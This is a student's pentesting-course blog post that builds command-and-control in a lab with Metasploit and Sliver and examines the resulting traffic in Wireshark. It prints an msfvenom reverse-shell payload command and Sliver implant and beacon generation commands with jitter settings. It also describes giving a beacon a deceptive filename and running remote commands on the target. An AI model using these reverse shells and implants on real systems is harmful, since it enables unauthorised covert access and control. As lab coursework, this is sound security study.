+++
title = "H6 - C2 with sliver and metasploit"
date = "2025-10-02"
categories = ["pentesting-course"]
+++

---

### a) Sniffing the venom

#### Establishing the connection and packet capture

Like usual, I check to make sure the virtual machines are off the internet and communicate with each other fine. Nothing has changed in the setup so everything is working a ok.

I open up wireshark and start capturing traffic.

I am going to use the same payload I used in H5 which was as follows:
`msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e generic/none -f elf` and remembering to open a port with `sudo ufw allow 4444/tcp`. 

Then I launch `msfconsole` and set all the parameters to match the payload and start the listening session with `exploit`. 

To establish the connection, I go to the target machine (ms2 vm) and
run the program. 

![Msfconsole](/tuukkaani-blog/img/h6/msfconsole.png)

#### Going through packet captures

Checking into wireshark and stopping the capture, I filter with
`tcp.port==4444` as that is the port I decided to use. With that I can see the captured traffic between the host and target:

![Wirkeshark msfvenom](/tuukkaani-blog/img/h6/wireshark_venom.png)

The port 4444 here raises some alarms as it is commonly used by metasploit for reverse shell connections.

---

### b) Creating a http connection with sliver

#### Sliver installation

Firstly, I'm installing sliver on my kali machine. The sliver github provides a single liner install `curl https://sliver.sh/install|sudo bash`. Trust me bro. During the installation, I was not clearly prompted for password at first, but if it seems to be stuck for you after running the one liner, just hit enter couple times and it should prompt you. After which running `sliver` should open up the program. [(Sliver Github 2025.)](https://github.com/BishopFox/sliver)

![Sliver](/tuukkaani-blog/img/h6/sliver.png)

And it does! Ain't it like giga cool (ofhell).

Note: it is october 2. 2025 and this is the v1.5.43 instead of the newer, but unfinished 1.6 build, so if in the future some of the functionality here is due to change.

#### Establishing connection with sliver

So I setup wireshark in the background to capture packets. I am capturing *eth0* which is the interface I use for offline testing while *eth1* uses my actual eth to connect to the internet. This is the same setup as the previous section. Just wanted to mention it here.

![Ip a](/tuukkaani-blog/img/h6/ipa.png)

Now, I familiarize myself with sliver by going over their provided getting started tutorial, which if I remember correctly does what I want to achieve here: establishing a http connection between the host and target.

So first I need to generate our implant which is the name sliver uses for malicious code run on the target machine [(Sliver 2025. Architecture.)](https://sliver.sh/docs?name=Architecture). 

I used the following command to generate the implant:
`generate -b 10.10.10.10 --os linux --skip-symbols --debug`

![Implant](/tuukkaani-blog/img/h6/implant.png)

Next I ran the implant on the target machine, which is Debian13 machine running in the same network.

![Implant at target](/tuukkaani-blog/img/h6/implant_target.png)

Using `sessions` we can see that our session has been established to the target machine:

![Sliver session](/tuukkaani-blog/img/h6/session.png)

Lastly I run `use` and select the proper implant and `pwd` to see I am actually in the target machine:

![Target](/tuukkaani-blog/img/h6/target.png)


[(Sliver 2025. Tutorials.)](https://sliver.sh/tutorials)


---

### c) Sniffing the sliver (*hihihihihihi*)

In the very short time I had the connection, I already have quite the wall in wireshark to look at:

![Wireshark sliver](/tuukkaani-blog/img/h6/wireshark_sliver.png)

A lot of weird GET requests in fast intervals. Just the amount from a single address is quite concerning and the requests themselves don't help. 

---

### d) Modifing the connection in sliver.

So it would be beneficial if we could at least limit the calling home to be less... obsessive. Luckily there is a way to do just that. In the [sliver.sh's beacons vs sessions tutorial](https://sliver.sh/tutorials?name=2+-+Beacons+vs+Sessions) some of these methods are used, and that is what I am going to be doing as well.

The tutorial mentions sessions being a single constantly maintained TCP connection, while beacons can call home every so often. 
[(Sliver 2025. Beacons vs Sessions.)](https://sliver.sh/tutorials?name=2+-+Beacons+vs+Sessions)

So firstly we will create a new beacon with this in mind:

`generate beacon -b 10.10.10.10 --os linux -j 5 -S 15 --skip-symbols --debug --save cockball_the_movie_starring_ben_stiller`

I decided to make the executable more... *executable* by giving it an enticing name. Maybe more importantly, it was given the flags `-j 5` and `-S 15`. What I could gather from the documentation [sliver getting started.](https://sliver.sh/docs?name=Getting%20Started), -S stands for how often the beacon should callback in seconds. -j stands for jitter and adds a random delay in seconds to the callback. [(Sliver 2025. Getting Started.)](https://sliver.sh/docs?name=Getting%20Started)

So time to test it out. I run the executable on the target machine:

![Target](/tuukkaani-blog/img/h6/target2.png)

Oh no! It seems you can't trust anything these days!!! Oh well. We get a callback from the beacon:

![Beacons](/tuukkaani-blog/img/h6/beacons.png)

Here we can see the last check-in and the next one. Time to check out what wireshark has in store for us!

![L + n00b](/tuukkaani-blog/img/h6/dummy.png)

Oopsie. Well I guess I'll have to let it run for couple of minutes.

![Wireshark sliver 2](/tuukkaani-blog/img/h6/wireshark_sliver2.png)

Now the calls are much less frequent and come at varying times.

[(Sliver 2025. Beacons vs Sessions.)](https://sliver.sh/tutorials?name=2+-+Beacons+vs+Sessions)

---


### e) Using sliver's different functionalities.

I begin by using the beacon with `use` and finishing off the name with tab:

![Beacon use](/tuukkaani-blog/img/h6/tab.png)

With `help` I can start checking out what kind of things I am able to do. Lets see if I can make the user's wallpaper to be a picture of Ben Stiller.

So I first need to get the picture to the target machine using the command `upload ben.png /home/user/Pictures/ben.png` which uploads file ben.png from our host to the target's Pictures directory:

![Ben](/tuukkaani-blog/img/h6/ben.png)
Image can be found here: [(Benjamin Lee 2015.)](https://www.theguardian.com/film/filmblog/2015/aug/03/zoolander-2-teaser-trailer-ben-stiller)

Next I need to change the Ben to be the wallpaper, I know the target uses gnome, so with a quick google I found a AskUbuntu post that gives me the command needed [(AskUbuntu 2011.)](https://askubuntu.com/questions/66914/how-to-change-desktop-background-from-command-line-in-unity):

`execute gsettings set org.gnome.desktop.background picture-uri file:///home/user/Pictures/ben.png`

Now, did my magnificent plan work? One could probably use sliver to take a screenshot, but found it only prints black squares on my vm, which might have something to do with displays etc. So here is a manual screenshot of the target:

![Oh boy](/tuukkaani-blog/img/h6/ohboy.png)

Now look at that! Amazing, truly!

---


### Sources

All the assignments this page is based on can be found at [Tero Karvinen](https://terokarvinen.com/tunkeutumistestaus/)

[Sliver Github 2025.](https://github.com/BishopFox/sliver)

[Sliver 2025. Tutorials.](https://sliver.sh/tutorials)

[Sliver 2025. Architecture.](https://sliver.sh/docs?name=Architecture)

[Sliver 2025. Beacons vs Sessions.](https://sliver.sh/tutorials?name=2+-+Beacons+vs+Sessions)
[Sliver 2025. Getting Started.](https://sliver.sh/docs?name=Getting%20Started)

[Benjamin Lee 2015. Long catwalk home: can Ben Stiller make audiences care about Zoolander 2?](https://www.theguardian.com/film/filmblog/2015/aug/03/zoolander-2-teaser-trailer-ben-stiller)
[AskUbuntu 2011. How to change desktop background from command line in Unity](https://askubuntu.com/questions/66914/how-to-change-desktop-background-from-command-line-in-unity)
